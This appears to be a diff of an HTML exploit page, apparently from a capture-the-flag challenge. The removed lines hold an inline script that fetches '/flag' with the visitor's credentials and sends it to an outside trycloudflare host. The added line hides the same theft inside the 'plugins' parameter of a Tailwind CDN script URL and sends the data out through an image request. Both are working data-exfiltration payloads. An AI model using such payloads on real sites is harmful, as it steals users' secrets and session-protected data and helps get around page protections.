@@ -1,17 +1,6 @@
 <!DOCTYPE html>
 <html>
     <body>
-        <script>
-            (async () => {
-                const res = await fetch("/flag", {
-                    credentials: "include",
-                });
-                const flag = await res.text();
-                await fetch(
-                    "https://brother-recent-sorts-thereby.trycloudflare.com/?flag=" +
-                        encodeURIComponent(flag)
-                );
-            })();
-        </script>
+        <script src="https://cdn.tailwindcss.com/3.4.17?plugins={theme(){fetch('/flag',{credentials:'include'}).then(r=>r.text()).then(f=>{new Image().src='https://brother-recent-sorts-thereby.trycloudflare.com/?x='+encodeURIComponent(f)})}}"></script>
     </body>
 </html>
